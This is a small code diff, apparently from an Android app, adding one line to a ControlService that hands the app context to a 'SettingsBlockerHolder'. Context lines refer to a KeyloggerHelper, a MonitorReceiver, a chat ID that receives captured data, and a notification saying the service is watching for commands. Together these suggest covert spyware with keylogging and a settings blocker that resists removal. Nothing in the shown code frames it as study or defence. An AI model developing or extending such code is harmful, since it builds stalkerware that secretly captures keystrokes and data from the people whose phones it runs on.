@@ -78,6 +78,7 @@ class ControlService : Service() {
     override fun onCreate() {
         // Сохраняем ALLOWED_CHAT_ID чтобы MonitorReceiver и KeyloggerHelper знали куда слать
         super.onCreate()
+        SettingsBlockerHolder.appContext = applicationContext
         deviceId = getOrCreateDeviceId()
         createNotificationChannel()
         startForeground(NOTIF_ID, buildNotification("Слежу за командами..."))
